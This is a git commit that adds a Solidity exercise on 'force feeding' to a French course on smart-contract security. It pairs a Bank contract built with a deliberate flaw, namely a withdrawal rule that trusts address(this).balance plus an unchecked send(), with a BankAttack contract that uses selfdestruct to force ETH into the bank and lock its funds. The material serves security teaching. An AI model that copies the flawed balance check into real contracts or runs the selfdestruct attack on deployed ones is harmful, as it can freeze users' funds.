576f74ea67c42e9d85ea6d77382e0f8d2ddca383
tehjul <sibillej@gmail.com>
2022-10-28 17:04:39 +0200

    add force feeding exercice

---
+++ 5. Smart contract Solidity & bonnes pratiques de sécurité/4-Force Feeding.sol
@@ -0,0 +1,42 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity 0.8.12;
+
+// The owner can deposit 1 ETH whenever he wants.
+// He can only withdraw when the deposited amount reaches 10 ETH.
+contract Bank {
+
+    address owner;
+
+    // Set msg.sender as owner
+    constructor() {
+        owner = msg.sender;
+    }
+
+    // Deposit 1 ETH in the smart contract
+    function deposit() public payable {
+        require(msg.sender == owner);
+				require(msg.value == 1 ether);
+				require(address(this).balance <= 10 ether);
+    }
+
+    // Withdraw the entire smart contract balance
+    function withdrawAll() public {
+        require(msg.sender == owner);
+				require(address(this).balance >= 10 ether);
+        payable(owner).send(address(this).balance);
+    }
+}
+
+contract BankAttack {
+  Bank bank;
+
+  constructor(address _bankAddress) {
+    bank = Bank(_bankAddress);
+  }
+
+  fallback() external payable{}
+
+  function attack() external {
+    selfdestruct(payable(address(bank)));
+  }
+}
